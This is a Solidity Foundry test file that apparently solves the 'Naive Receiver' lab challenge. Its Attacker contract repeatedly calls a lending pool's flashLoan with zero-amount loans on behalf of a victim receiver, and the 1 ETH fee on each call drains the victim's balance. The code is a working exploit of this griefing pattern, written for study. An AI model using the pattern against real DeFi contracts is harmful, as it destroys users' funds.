// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {NaiveReceiverLenderPool} from "../src/NaiveReceiverLenderPool.sol";
import {FlashLoanReceiver} from "../src/FlashLoanReceiver.sol";
import {IERC3156FlashLender} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {SafeTransferLib} from "solady/src/utils/SafeTransferLib.sol";
import {Test, console} from "forge-std/Test.sol";


/// @notice Designed to call the NaiveReceiverLenderPool contract multiple times
contract Attacker {
    NaiveReceiverLenderPool naiveReceiverLenderPool;
    FlashLoanReceiver flashLoanReceiver;

    constructor(NaiveReceiverLenderPool _naiveReceiverLenderPool, FlashLoanReceiver _flashLoanReceiver) {
        naiveReceiverLenderPool = _naiveReceiverLenderPool;
        flashLoanReceiver =  _flashLoanReceiver;
    }

    function attack(uint256 number, address token) public payable {
        for(uint256 i = 0; i < number; i++) {
              naiveReceiverLenderPool.flashLoan(flashLoanReceiver, token, 0, "");
        }
      
    }

}


contract TestAttactWorks is Test{
    NaiveReceiverLenderPool naiveReceiverLenderPool;
    FlashLoanReceiver flashLoanReceiver;
    Attacker attacker;

    uint256 constant ETHER_IN_POOL = 1000 ether;
    uint256 constant TOKENS_IN_POOL_FEES = 1 ether;
    uint256 constant RECIEVER_INITIAL_BALANCE = 10 ether;

    address player1 = makeAddr("player");
    address player2 = makeAddr("player2");
    address feeReciepent = makeAddr("feeReceiver");

    address ETH;
   
    function setUp() public  {
        naiveReceiverLenderPool = new NaiveReceiverLenderPool();

        flashLoanReceiver = new FlashLoanReceiver(address(naiveReceiverLenderPool));
        
        vm.prank(player1);
        attacker = new Attacker(naiveReceiverLenderPool, flashLoanReceiver);


        ETH = naiveReceiverLenderPool.ETH();

        vm.deal(address(naiveReceiverLenderPool), ETHER_IN_POOL);
        vm.deal(address(flashLoanReceiver), RECIEVER_INITIAL_BALANCE);
        vm.deal(address(attacker), 1600 ether);
        vm.deal(player1, 10000 ether);

     }

    function test__canWithdrawAllfunds() public {

        //checking the contract balances and fees
        assertEq(naiveReceiverLenderPool.maxFlashLoan((ETH)), ETHER_IN_POOL);
        assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL);
        assertEq(naiveReceiverLenderPool.flashFee(address(ETH), 0), 1 ether);
        assertEq(address(flashLoanReceiver).balance, RECIEVER_INITIAL_BALANCE);

        vm.expectRevert();
        flashLoanReceiver.onFlashLoan(address(flashLoanReceiver), ETH, RECIEVER_INITIAL_BALANCE, 1 ether, "");

        //Player1 uses the FlashLoanReceiver contract to call NaiveReceiverLenderPool contract
        vm.startPrank(player1);
        naiveReceiverLenderPool.flashLoan(flashLoanReceiver, ETH, 0 ether, "");
        console.log("Balance of flashLoanReceiver is:", address(flashLoanReceiver).balance); // Balance of FlashLoanReceiver is reduced to 9 (RECIEVER_INITIAL_BALANCE - 1 ETH FEES)
        vm.stopPrank();

        //Using the Attacker contract to call NaiveReceiverLenderPool contract
        vm.startPrank(player1);
        console.log(address(naiveReceiverLenderPool).balance);
        attacker.attack(9, ETH);
        console.log(address(naiveReceiverLenderPool).balance);
        console.log("Balance of flashLoanReceiver is:", address(flashLoanReceiver).balance);
        // Balance of FlashLoanReceiver is reduced to 0 (RECIEVER_INITIAL_BALANCE - 9 ETH FEES) as Attacker::attack was called 9 times
        vm.stopPrank();

    }
    
}